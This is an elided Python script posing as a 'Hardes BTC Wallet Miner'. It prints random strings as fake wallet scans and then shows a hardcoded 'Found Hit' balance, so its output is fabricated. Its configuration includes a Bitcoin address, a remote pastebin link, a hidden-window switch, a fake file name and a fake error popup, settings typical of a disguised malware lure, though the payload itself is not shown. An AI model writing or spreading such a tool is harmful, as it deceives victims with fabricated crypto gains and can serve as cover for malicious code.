...
# Configuration
debugger = False
BTC_ADDRESS = '3AACZAgik8ZFgjpcWWA1of6UzYXnjySapS'
pastebin = "https://pastebin.com/raw/DLJg9dbt"
hiddenWindow = False
FakeFileName = "Hardes BTC Wallet Miner"
fakeError = False
fakeErrorMessage = "An unexpected error has occured. Refresh please!"
fakeErrorTitle = "Oops!"
...
os.system('cls')
title = pyfiglet.figlet_format("Hardes", font = "slant"  )
print(title)
print(f"                                                {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Dev by @cryptobullet on Tiktok {Fore.LIGHTGREEN_EX}")
print(f"            [ Hardes, Wallet Mining Service. ]")
print(f"        {Fore.WHITE}[ {Fore.CYAN}1 {Fore.WHITE}] : {Fore.CYAN}Start BTC Wallet Mining")
print(f"        {Fore.WHITE}[ {Fore.CYAN}2{Fore.WHITE} ] : {Fore.CYAN}Quit")
...
if option == '2':
    print(f'{Fore.RED} Closing Hardes Bitcoin Wallet Miner..')
    exit(0)
...
confirmation = input('')
if confirmation == 'Y':
print(f'{Fore.WHITE} [{Fore.RED}!{Fore.WHITE}] {Fore.MAGENTA}Set the Wallet.')
    time.sleep(0.5)
    print(f'{Fore.WHITE} [{Fore.RED}!{Fore.WHITE}] {Fore.GREEN}Successfull, Wallet Address was ADDED')
    time.sleep(1.5)
    os.system('cls')
...
for line in range(6000):
    time.sleep(0.03)
    result = print(f'{Fore.WHITE}[{Fore.GREEN} - {Fore.RED}{Fore.WHITE}] {Fore.LIGHTCYAN_EX} -> 0.000000 BTC {Fore.GREEN}', "".join(random.choice(letters) for i in range(42)))
    print(result)
print(f'{Fore.WHITE}[ {Fore.RED}! {Fore.WHITE}] : {Fore.LIGHTMAGENTA_EX} Found Hit! Press ENTER To Continue.\n')
input()
btc_amount = "0,1294031"
btc_usd_amount = "4763,43 USD"
...
print(f'{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] Closing Hardes Wallet Miner.')
exit(0)
